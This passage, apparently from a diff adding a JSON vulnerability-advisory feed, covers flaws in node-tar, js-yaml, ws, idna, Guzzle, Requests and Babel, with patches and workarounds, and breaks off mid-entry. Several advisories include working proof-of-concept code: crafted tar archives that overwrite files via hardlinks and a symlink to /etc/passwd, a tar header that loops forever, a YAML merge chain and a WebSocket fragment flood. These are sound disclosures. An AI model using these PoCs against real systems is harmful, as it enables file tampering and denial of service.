+      "detail": "## Impact\n\nUsing `@babel/core` to compile maliciously crafted code can allow ab attacker to read any source map from the system that is running Babel, if these conditions are _all_ true:\n- the attacker controls the input source code\n- the attacker can read the output source code\n- the attacker knows the path of the source map file that they want to read\n\n**Users that only compile trusted code are not impacted.**\n\n## Patches\n\nThe vulnerability has been fixed in `@babel/core@7.29.6` and `@babel/core@8.0.0-rc.6`.\n\n## Workarounds\n\nCallers can mitigate the issue without upgrading by setting [`inputSourceMap: false`](https://babeljs.io/docs/options#inputsourcemap) in their Babel options.\n\nCallers can also manually extract the `#sourceMappingURL` comment from the input source code, validate whether the source map that it links to is allowed to be read, and if it is pass an object to `inputSourceMap` (passing `false` when it's not).\n\n## Credits\n\nThanks Teodor-Cristian Radoi for reporting the vulnerability.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49356"
+        }
+      ],
+      "published": "2026-06-15T17:14:14Z",
+      "updated": "2026-07-15T22:30:42Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/%40babel/core"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-52cp-r559-cp3m",
+      "references": [
+        {
+          "id": "CVE-2026-59869",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "js-yaml: YAML merge-key chains can force quadratic CPU consumption",
+      "detail": "### Impact\n\njs-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:\n\n```yaml\na0: \u0026a0 { k0: 0 }\na1: \u0026a1 { \u003c\u003c: *a0, k1: 1 }\na2: \u0026a2 { \u003c\u003c: *a1, k2: 2 }\na3: \u0026a3 { \u003c\u003c: *a2, k3: 3 }\n...\nb: *aN\n```\n\nFor each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.\n\n### PoC\n\nFrom N = 4000 delay become \u003e 1s (doc size \u003c 100K)\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { Buffer } from 'node:buffer'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = Number(process.argv[2] || 4000)\n\nfunction makeMergeChain (count) {\n  const lines = ['a0: \u0026a0 { k0: 0 }']\n\n  for (let i = 1; i \u003c count; i++) {\n    lines.push(`a${i}: \u0026a${i} { \u003c\u003c: *a${i - 1}, k${i}: ${i} }`)\n  }\n\n  lines.push(`b: *a${count - 1}`)\n  return `${lines.join('\\n')}\\n`\n}\n\nconst source = makeMergeChain(n)\n\nconsole.log(source.split('\\n').slice(0, 8).join('\\n'))\nconsole.log('...')\nconsole.log(source.split('\\n').slice(-4).join('\\n'))\nconsole.log()\nconsole.log(`N: ${n}`)\nconsole.log(`YAML size: ${Buffer.byteLength(source)} bytes`)\n\nconst started = performance.now()\nconst result = load(source, { schema: YAML11_SCHEMA })\nconst elapsed = performance.now() - started\n\nconsole.log(`parse time: ${elapsed.toFixed(1)} ms`)\nconsole.log(`top-level keys: ${Object.keys(result).length}`)\nconsole.log(`b keys: ${Object.keys(result.b).length}`)\n```\n\n### Patches\n\nFix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59869"
+        }
+      ],
+      "published": "2026-07-20T21:19:09Z",
+      "updated": "2026-07-21T20:59:34Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/js-yaml"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-5955-9wpr-37jh",
+      "references": [
+        {
+          "id": "CVE-2021-37713",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
+        }
+      ],
+      "description": "Arbitrary File Creation/Overwrite on Windows via insufficient relative path sanitization",
+      "detail": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.\n\nThis logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\\path`.  If the drive letter does not match the extraction target, for example `D:\\extraction\\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.\n\nAdditionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.\n\nThis only affects users of `node-tar` on Windows systems.\n\n### Patches\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### Workarounds\n\nThere is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.\n\nUsers are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.\n\n### Fix\n\nThe fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not \"absolute\".\n\nAdditionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.\n\nFinally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.\n",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37713"
+        }
+      ],
+      "published": "2021-08-31T16:05:05Z",
+      "updated": "2026-07-08T06:28:41Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-65pc-fj4g-8rjx",
+      "references": [
+        {
+          "id": "CVE-2026-45409",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2026-215",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "description": "Internationalized Domain Names in Applications (IDNA): Specially crafted inputs to idna.encode() can bypass CVE-2024-3651 fix",
+      "detail": "This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. Payloads such as `\"\\u0660\" * N` or `\"\\u30fb\" * N + \"\\u6f22\"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process.\n\n### Impact\nA specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.\n\n### Patches\nStarting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support).\n\n### Workarounds\nDomain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45409"
+        }
+      ],
+      "published": "2026-05-19T14:34:32Z",
+      "updated": "2026-07-08T17:45:15Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/idna"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-83g3-92jg-28cx",
+      "references": [
+        {
+          "id": "CVE-2026-26960",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "description": "Arbitrary File Read/Write via Hardlink Target Escape Through Symlink Chain in node-tar Extraction",
+      "detail": "### Summary\n`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.\n\nThis enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).\n\nSeverity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.\n\n### Details\nThe bypass chain uses two symlinks plus one hardlink:\n\n1. `a/b/c/up -\u003e ../..`\n2. `a/b/escape -\u003e c/up/../..`\n3. `exfil` (hardlink) -\u003e `a/b/escape/\u003ctarget-relative-to-parent-of-extract\u003e`\n\nWhy this works:\n\n- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.\n  - See `STRIPABSOLUTEPATH` logic in:\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`\n\n- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`\n\n- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`\n\nAs a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.\n\n### PoC\n[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)\nEnvironment used for validation:\n\n- Node: `v25.4.0`\n- tar: `7.5.7`\n- OS: macOS Darwin 25.2.0\n- Extract options: defaults (`tar.extract({ file, cwd })`)\n\nSteps:\n\n1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.\n\n2. Run:\n\n```bash\nTAR_MODULE=\"$(cd '../tar-audit-setuid - CVE/node_modules/tar' \u0026\u0026 pwd)\" node hardlink.js\n```\n\n3. Expected vulnerable output (key lines):\n\n```text\nsame_inode=true\nread_ok=true\nwrite_ok=true\nresult=VULNERABLE\n```\n\nInterpretation:\n\n- `same_inode=true`: extracted `exfil` and external secret are the same file object.\n- `read_ok=true`: reading `exfil` leaks external content.\n- `write_ok=true`: writing `exfil` modifies external file.\n\n### Impact\nVulnerability type:\n\n- Arbitrary file read/write via archive extraction path confusion and link resolution.\n\nWho is impacted:\n\n- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.\n- Impact scope is the privileges of the extracting process user.\n\nPotential outcomes:\n\n- Read sensitive files reachable by the process user.\n- Overwrite writable files outside extraction root.\n- Escalate impact depending on deployment context (keys, configs, scripts, app data).",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26960"
+        }
+      ],
+      "published": "2026-02-18T00:57:13Z",
+      "updated": "2026-02-20T17:04:10Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-8qq5-rm4j-mr97",
+      "references": [
+        {
+          "id": "CVE-2026-23745",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N"
+        }
+      ],
+      "description": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+      "detail": "### Summary\n\nThe `node-tar` library (`\u003c= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup \u0026 Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() =\u003e {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23745"
+        }
+      ],
+      "published": "2026-01-16T21:16:20Z",
+      "updated": "2026-02-22T23:20:34Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-8x88-c5mf-7j5w",
+      "references": [
+        {
+          "id": "CVE-2026-59874",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "description": "node-tar: Negative tar entry size causes infinite loop in archive replace",
+      "detail": "### Summary\n\nA checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.\n\n### Details\n\nThe public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.\n\nTar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.\n\nFor a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.\n\nThis is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.\n\n### PoC\n\nSave as `poc.mjs` in a project with the vulnerable package installed and run:\n\n```bash\nnode poc.mjs\n```\n\n```js\nimport fs from 'node:fs'\nimport os from 'node:os'\nimport path from 'node:path'\nimport { spawnSync } from 'node:child_process'\n\nconst oct = (b, n, off, len) =\u003e\n  b.write(n.toString(8).padStart(len - 1, '0') + '\\0', off, len, 'ascii')\n\nconst badHeader = () =\u003e {\n  const h = Buffer.alloc(512)\n\n  h.write('x', 0)\n  oct(h, 0o644, 100, 8)\n  oct(h, 0, 108, 8)\n  oct(h, 0, 116, 8)\n\n  // base-256 encoded -512 in the size field\n  Buffer.alloc(10, 0xff).copy(h, 124)\n  h[134] = 0xfe\n  h[135] = 0x00\n\n  oct(h, 0, 136, 12)\n  h.fill(0x20, 148, 156)\n  h[156] = 0x30\n  h.write('ustar\\0' + '00', 257, 8, 'binary')\n\n  let sum = 0\n  for (const c of h) sum += c\n  h.write(sum.toString(8).padStart(6, '0') + '\\0 ', 148, 8, 'ascii')\n\n  return h\n}\n\nconst dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))\nconst file = path.join(dir, 'poc.tar')\n\nfs.writeFileSync(file, badHeader())\nfs.writeFileSync(path.join(dir, 'add.txt'), 'x')\n\nconst r = spawnSync(\n  process.execPath,\n  [\n    '--input-type=module',\n    '-e',\n    `\n      import * as tar from 'tar'\n      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])\n      console.log('completed')\n    `,\n  ],\n  { timeout: 20_000 }\n)\n\nconsole.log(r.error?.code === 'ETIMEDOUT')\n\n// Output: true\n```\n\n### Impact\n\nAn application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59874"
+        }
+      ],
+      "published": "2026-07-20T21:51:39Z",
+      "updated": "2026-07-21T14:59:37Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-94pj-82f3-465w",
+      "references": [],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+        }
+      ],
+      "description": "Guzzle: Proxy-Authorization headers can be sent to origin servers",
+      "detail": "### Impact\n\nIn affected versions, the built-in cURL handlers (`CurlHandler` and `CurlMultiHandler`) put every first-class request header in cURL's origin header list (`CURLOPT_HTTPHEADER`). These handlers are the default when the PHP cURL extension is available. They move `Proxy-Authorization` to the proxy-only list (`CURLOPT_PROXYHEADER`) only when Guzzle predicts an HTTP or HTTPS proxy. A \"first-class\" header is part of the normal request message and can be set on a PSR-7 request, through client `headers` defaults, the `headers` request option, or middleware. It does not include a literal line supplied through raw `CURLOPT_HTTPHEADER`, `CURLOPT_PROXYHEADER`, or `stream_context.http.header` controls.\n\nBecause that migration follows Guzzle's prediction rather than the route libcurl actually takes, the credential stays in the origin list and is sent to the origin server when a request is:\n\n- direct, including `proxy` set to `''` to disable proxying.\n- bypassed by a `no`, `no_proxy`, or `NO_PROXY` match.\n- sent through a SOCKS proxy, which does not use the HTTP proxy header channel.\n- redirected from a safely proxied hop into any of those routes: redirect middleware re-evaluates the proxy per hop but, unlike `Authorization` and `Cookie`, does not strip `Proxy-Authorization` cross-origin.\n\nOn installations whose libcurl is older than 7.37.0, or whose PHP cURL extension lacks `CURLOPT_PROXYHEADER`, `CURLOPT_HEADEROPT`, and `CURLHEADER_SEPARATE`, no proxy-only channel is available, so cURL left the header in the origin list for every route. The stream handler also serialized first-class values before selecting a proxy. PHP removes only the first `Proxy-Authorization` line from CONNECT, so another first-class value or a URL-userinfo Basic line could reach the tunneled origin. A later raw `stream_context.http.proxy` override could instead reroute either credential directly to the origin.\n\nThe disclosed value is a private credential meant only for the proxy. RFC 9110 defines `Proxy-Authorization` as credentials for the next inbound proxy, and an origin is never an intended recipient. The flaw can silently give a working proxy credential to an unrelated third party. In the worst case, an attacker controls the origin and records the credential through access logs, tracing systems, or application logs. If it remains valid, the attacker can abuse a paid or access-controlled proxy, impersonate the proxy principal, or reach destinations the proxy is trusted to reach. A strong remote exploit is possible when an application sends a request to an attacker-controlled HTTP URL through a proxy with a default `Proxy-Authorization` header, then follows the attacker's redirect to an HTTPS or no-proxy destination that Guzzle reaches directly.\n\nUsing a first-class `Proxy-Authorization` header is a legitimate, documented configuration, so affected applications are not misusing the library. Guzzle does not create this field, so applications that never configure one are unaffected by the first-class-header flaw. Proxy URL userinfo is not affected on its own, but the stream handler could expose its Basic line when combined with a first-class field or a later raw `stream_context.http.proxy` override. `CURLOPT_PROXYUSERPWD` is unaffected. Literal lines supplied through raw `CURLOPT_HTTPHEADER`, `CURLOPT_PROXYHEADER`, or `stream_context.http.header` remain caller-controlled and outside the first-class-header guarantee.\n\n### Patches\n\nThe issue is fixed in `7.14.2`. The cURL handlers keep first-class `Proxy-Authorization` values out of the origin header list. When proxy header separation is available, they pass the values through `CURLOPT_PROXYHEADER` with `CURLHEADER_SEPARATE`. An empty value uses cURL's semicolon form to suppress credentials from proxy URL userinfo. On older builds, Guzzle drops the field for direct, bypassed, and SOCKS routes, but fails before network I/O if the request might use an HTTP or HTTPS proxy.\n\nThe stream handler removes the field from origin headers before choosing a route. If it selects a proxy, it accepts one value, including empty, writes a validated proxy header, and gives that value precedence over proxy URL userinfo. Multiple values, line breaks, and raw proxy overrides that could reroute generated credentials fail before connection. Direct and bypassed requests drop the field. Versions before `7.14.2` are affected by these origin-bound credential paths.\n\n### Workarounds\n\nIf you cannot upgrade immediately, remove first-class `Proxy-Authorization` fields from requests, client defaults, and middleware. Supply proxy credentials instead through proxy URL userinfo, for example `http://user:pass@proxy.example:8080`, or use `CURLOPT_PROXYUSERPWD` with the cURL handlers. Do not combine proxy URL userinfo with a first-class field or a raw `stream_context.http.proxy` override. If a first-class field is unavoidable, use libcurl 7.37.0 or newer with `CURLOPT_PROXYHEADER`, `CURLOPT_HEADEROPT`, and `CURLHEADER_SEPARATE`, and ensure the field is never present on a client that can issue direct, bypassed, or SOCKS requests or follow redirects into those routes. A newer libcurl is necessary but does not fix Guzzle's route-dependent migration by itself, and disabling redirects reduces but does not eliminate exposure.\n\n### References\n\n* https://www.rfc-editor.org/rfc/rfc9110.html#section-11.7.2\n* https://curl.se/libcurl/c/CURLOPT_PROXYHEADER.html\n* https://curl.se/libcurl/c/CURLOPT_HEADEROPT.html\n* https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html",
+      "advisories": [],
+      "published": "2026-07-20T21:46:02Z",
+      "updated": "2026-07-21T20:59:33Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:composer/guzzlehttp/guzzle"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-96hv-2xvq-fx4p",
+      "references": [
+        {
+          "id": "CVE-2026-48779",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "description": "ws: Memory exhaustion DoS from tiny fragments and data chunks",
+      "detail": "### Impact\n\nA high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.\n\n### Proof of concept\n\n```js\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer({ port: 0 }, function () {\n  const data = Buffer.alloc(1);\n  const options = { fin: false };\n  const { port } = wss.address();\n  const ws = new WebSocket(`ws://localhost:${port}`);\n\n  ws.on('open', function () {\n    (function send() {\n      ws.send(data, options, function (err) {\n        if (err) return;\n        send();\n      });\n    })();\n  });\n\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`client close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n\nwss.on('connection', function (ws) {\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`server close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).\n\n### Workarounds\n\nIn vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.\n\n### Credits\n\nThe vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077).",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48779"
+        }
+      ],
+      "published": "2026-06-15T16:34:23Z",
+      "updated": "2026-07-13T15:49:19Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/ws"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9hjg-9r4m-mvj7",
+      "references": [
+        {
+          "id": "CVE-2024-47081",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2026-1872",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "description": "Requests vulnerable to .netrc credentials leak via malicious URLs",
+      "detail": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47081"
+        }
+      ],
+      "published": "2025-06-09T19:06:08Z",
+      "updated": "2026-07-07T17:56:56Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9ppj-qmqm-q256",
+      "references": [
+        {
+          "id": "CVE-2026-31802",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N"
+        }
+      ],
+      "description": "node-tar Symlink Path Traversal via Drive-Relative Linkpath",
+      "detail": "### Summary\n`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.\n\nWhat happens with `linkpath: \"C:../../../target.txt\"`:\n1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.\n2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.\n3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.\n4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.10`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(cwd, 'poc.tar')\n\nfs.writeFileSync(target, 